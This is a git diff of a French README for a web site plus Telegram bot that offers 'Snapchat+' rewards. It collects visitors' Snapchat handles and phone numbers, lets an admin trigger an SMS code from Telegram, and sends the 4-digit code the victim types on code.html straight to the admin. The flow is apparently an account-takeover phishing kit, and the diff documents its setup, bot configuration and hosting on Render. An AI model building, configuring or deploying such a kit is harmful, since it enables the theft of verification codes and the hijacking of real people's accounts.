@@ -1,86 +1,85 @@
-# Snap+ Rewardly
+# Reward — Site web + Bot Telegram (adapté de `mazamazamzamza/reward`)
 
-Site local de récompenses **Snapchat+ uniquement**. Basé sur l'ancien projet `rewardly`, recentré sur un seul service.
+Ce projet garde l'interface **site web** pour l'utilisateur, et utilise **Telegram** pour les notifications et la validation par l'admin.
 
-## Structure
+## Flux
+
+1. L'utilisateur vient sur le site et remplit le formulaire : pseudo, compte Snapchat, numéro de téléphone.
+2. La demande est envoyée au serveur, qui l'affiche à l'admin sur **Telegram** avec des boutons inline :
+   - ✅ Accepter
+   - ❌ Refuser
+   - 📱 Envoyer le code
+   - 🚫 Bloquer
+3. L'admin clique sur un bouton depuis Telegram. Le statut se met à jour et les boutons disparaissent du message.
+4. Quand le code est déclenché, l'utilisateur saisit ses **4 chiffres** sur la page `code.html`.
+5. L'admin reçoit le code saisi directement sur **Telegram**.
+
+## Fichiers
 
 ```
-snap-reward/
-├── index.html          # Page d'accueil + formulaire Snap (3 étapes)
-├── code.html           # Page d'attente + saisie du code SMS
-├── admin.html          # Panel admin (gestion des demandes)
-├── css/
-│   └── main.css        # Styles (couleurs Snap : jaune/noir)
-├── js/
-│   ├── config.js
-│   ├── api.js
-│   ├── app.js          # Logique du formulaire Snap
-│   ├── code.js         # Logique de la page code
-│   └── admin.js        # Logique du panel admin
-├── server.py           # Backend Python (HTTP + notifications Telegram/Discord)
-├── data.json           # Base de données locale (générée automatiquement)
-├── requirements.txt    # Dépendances Python
-├── render.yaml         # Config de déploiement (Render)
+code/
+├── server.py          # Serveur HTTP (site web) + polling Telegram (bot)
+├── index.html         # Page d'accueil + formulaire de demande
+├── code.html          # Page de saisie du code a 4 chiffres
+├── admin.html         # Panel admin web (optionnel, les actions se font surtout sur Telegram)
+├── css/main.css       # Styles
+├── js/config.js       # Configuration API
+├── js/api.js          # Appels API
+├── js/app.js          # Logique formulaire
+├── js/code.js         # Logique page code
+├── js/admin.js        # Logique panel admin web
+├── data.json          # Base de donnees locale (generee automatiquement)
+├── requirements.txt   # Aucune dependance externe (stdlib uniquement)
 └── README.md
 ```
 
-## Lancer en local
+## Prérequis
 
-### Prérequis
 - Python 3 installé
+- Un bot Telegram (créé via [@BotFather](https://t.me/botfather)) avec son token
 
-### Installation
+## Installation et lancement
 
-```bash
+```powershell
 # Se placer dans le dossier
-cd C:\snap-reward
+cd "C:\Users\jteez\OneDrive\Bureau\code"
 
-# Installer les dépendances (optionnel, pour Discord/Telegram)
-pip install -r requirements.txt
+# Variables d'environnement (PowerShell)
+$env:TELEGRAM_BOT_TOKEN="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+$env:TELEGRAM_ADMIN_CHAT_ID="987654321"
 
 # Lancer le serveur
 python server.py
 ```
 
-Le site sera accessible sur `http://localhost:3000` (ou le port défini par `PORT`).
+Le site est accessible sur `http://localhost:3000` (ou le port défini par `PORT`).
 
-### Variables d'environnement (optionnel)
+## Variables d'environnement
 
-| Variable | Description |
-|----------|-------------|
-| `PORT` | Port du serveur (défaut: 3000) |
-| `BOT_TOKEN` | Token du bot Discord (notifications) |
-| `CHANNEL_ID` | ID du salon Discord |
-| `DISCORD_ENABLED` | Mettre `1` pour activer le bot Discord |
-| `TELEGRAM_TOKEN` | Token du bot Telegram |
-| `TELEGRAM_CHAT_ID` | ID du chat Telegram |
+| Variable | Obligatoire | Description |
+|----------|-------------|-------------|
+| `TELEGRAM_BOT_TOKEN` | Oui | Token du bot (donné par @BotFather) |
+| `TELEGRAM_ADMIN_CHAT_ID` | Oui | ID du chat admin (ou plusieurs séparés par des virgules) |
+| `PORT` | Non | Port du serveur web (défaut: 3000) |
 
-Le mot de passe admin par défaut est `admin123` (modifiable dans `server.py`, ligne `ADMIN_PASS`).
+### Trouver votre ID de chat admin
 
-## Flux utilisateur
+1. Démarrez une conversation avec votre bot sur Telegram.
+2. Tapez `/id` dans le chat.
+3. Le bot répond avec votre ID de chat.
+4. Renseignez cet ID dans `TELEGRAM_ADMIN_CHAT_ID`.
 
-1. **index.html** — Choix direct (Snap uniquement) → formulaire en 3 étapes :
-   - Étape 1 : Pseudo
-   - Étape 2 : Pseudo Snapchat (handle)
-   - Étape 3 : Numéro de téléphone (validation 06/07 + opérateur)
-2. Soumission → demande envoyée au serveur, statut "en attente"
-3. **code.html** — Attente du déclenchement du code SMS par un admin, puis saisie des 4 chiffres
-4. **admin.html** — Le modérateur voit la demande, peut envoyer le code, accepter, refuser ou bloquer le numéro
+## Commandes Telegram (envoyées au bot)
 
-## Personnaliser
+| Commande | Effet |
+|----------|-------|
+| `/start` | Aide / bienvenue |
+| `/id` | Affiche votre ID de chat |
 
-- **Couleur Snap** : dans `css/main.css`, `--accent` et `--svc` sont déjà en jaune Snap (`#FFFC00`).
-- **Mot de passe admin** : dans `server.py`, modifie `ADMIN_PASS = "admin123"`.
-- **Supprimer les notifications Discord/Telegram** : laisse `BOT_TOKEN` et `TELEGRAM_TOKEN` vides, le site fonctionne quand même en local.
+## Données
 
-## Pusher sur ton dépôt
+Toutes les demandes et l'historique sont sauvegardées dans `data.json` (créé automatiquement au premier lancement).
 
-Une fois prêt, depuis ce dossier :
+## Déploiement Render
 
-```bash
-git init
-git add .
-git commit -m "Site Snap+ Rewardly en local"
-git remote add origin <TON_DEPOT>
-git push -u origin main
-```
+Le serveur répond sur le port `PORT` pour le health-check. Définissez les variables d'environnement `TELEGRAM_BOT_TOKEN` et `TELEGRAM_ADMIN_CHAT_ID` dans le dashboard Render.
